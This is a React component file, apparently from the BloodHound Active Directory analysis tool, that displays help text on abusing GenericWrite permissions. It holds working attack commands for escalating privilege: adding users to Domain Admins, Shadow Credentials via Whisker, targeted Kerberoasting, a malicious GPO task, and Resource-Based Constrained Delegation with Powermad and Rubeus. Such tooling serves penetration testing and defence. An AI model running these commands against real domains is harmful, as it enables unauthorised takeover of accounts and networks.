// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, targetType }) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite to a group allows you to directly modify group membership of the group.
                    </Typography>
                    <Typography variant='body2'>
                        There are at least two ways to execute this attack. The first and most obvious is by using the
                        built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See
                        the opsec considerations tab for why this may be a bad idea. The second, and highly recommended
                        method, is by using the Add-DomainGroupMember function in PowerView. This function is superior
                        to using the net.exe binary in several ways. For instance, you can supply alternate credentials,
                        instead of needing to run a process as or logon as the user with the AddMember permission.
                        Additionally, you have much safer execution options than you do with spawning net.exe (see the
                        opsec tab).
                    </Typography>
                    <Typography variant='body2'>
                        To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into
                        your agent session or into a PowerShell instance at the console. You may need to authenticate to
                        the Domain Controller as
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object
                        (these examples comes from the PowerView help documentation):
                    </Typography>
                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>
                    <Typography variant='body2'>
                        Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a
                        process as {sourceName}:
                    </Typography>
                    <Typography component={'pre'}>
                        {"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}
                    </Typography>
                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group with PowerView's
                        Get-DomainGroupMember:
                    </Typography>
                    <Typography component={'pre'}>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                        attribute of target. Writing to this property allows an attacker to create "Shadow Credentials"
                        on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the
                        "AddKeyCredentialLink" edge.
                    </Typography>
                    <Typography variant='body2'>
                        Alternatively, GenericWrite enables {sourceName} to set a ServicePrincipalName (SPN) on the
                        targeted user, which may be abused in a Targeted Kerberoast attack.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User' || sourceType === 'Computer'
                            ? `${sourceName} if you are not running a process as that user/computer`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                    </Typography>

                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the Whisker documentation.
                    </Typography>

                    <Typography variant='body1'> Targeted Kerberoast attack </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with
                        Get-DomainSPNTicket.
                    </Typography>
                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainObject, first create a PSCredential object (these
                        examples comes from the PowerView help documentation):
                    </Typography>
                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>
                    <Typography variant='body2'>
                        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process
                        as {sourceName}:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        After running this, you can use Get-DomainSPNTicket as follows:
                    </Typography>
                    <Typography component={'pre'}>{'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'}</Typography>
                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the
                        ServicePrincipalName can be done with the Set-DomainObject command:
                    </Typography>
                    <Typography component={'pre'}>
                        {'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'}
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite on a GPO, you may make modifications to that GPO which will then apply to the
                        users and computers affected by the GPO. Select the target object you wish to push an evil
                        policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows
                        item-level targeting, such as a new immediate scheduled task. Then wait for the group policy
                        client to pick up and execute the new evil policy. See the references tab for a more detailed
                        write up on this abuse.
                    </Typography>
                    <Typography variant='body2'>
                        This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with
                        'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to
                        add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for
                        the given GPO. Therefore, you need write access to child objects of this folder or create child
                        objects permission. The security descriptor of the GPO is reflected on the folder, meaning
                        permissions to write child items on the GPO are required.
                    </Typography>
                </>
            );
        case 'Computer':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                        attribute of {targetName}. Writing to this property allows an attacker to create "Shadow
                        Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is
                        equivalent to the "AddKeyCredentialLink" edge.
                    </Typography>

                    <Typography variant='body2'>
                        Alternatively, GenericWrite on a computer object can be used to perform a Resource-Based
                        Constrained Delegation attack.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User' || sourceType === 'Computer'
                            ? `${sourceName} if you are not running a process as that user/computer`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                    </Typography>

                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the Whisker documentation.
                    </Typography>

                    <Typography variant='body1'> Resource-Based Constrained Delegation attack </Typography>

                    <Typography variant='body2'>
                        Abusing this primitive is possible through the Rubeus project.
                    </Typography>

                    <Typography variant='body2'>
                        First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad
                        project can be used to add a new attacker-controlled computer account:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        PowerView can be used to then retrieve the security identifier (SID) of the newly created
                        computer account:
                    </Typography>

                    <Typography component={'pre'}>
                        $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
                        objectsid
                    </Typography>

                    <Typography variant='body2'>
                        We now need to build a generic ACE with the attacker-added computer SID as the principal, and
                        get the binary bytes for the new DACL/ACE:
                    </Typography>

                    <Typography component={'pre'}>
                        {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                            '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                            '$SD.GetBinaryForm($SDBytes, 0)'}
                    </Typography>

                    <Typography variant='body2'>
                        Next, we need to set this newly created security descriptor in the
                        msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again
                        using PowerView in this case:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    </Typography>

                    <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>

                    <Typography variant='body2'>
                        And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname)
                        we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this
                        case grants us access to the file system of the TARGETCOMPUTER:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                        }
                    </Typography>
                </>
            );
        default:
            return null;
    }
};

export default WindowsAbuse;
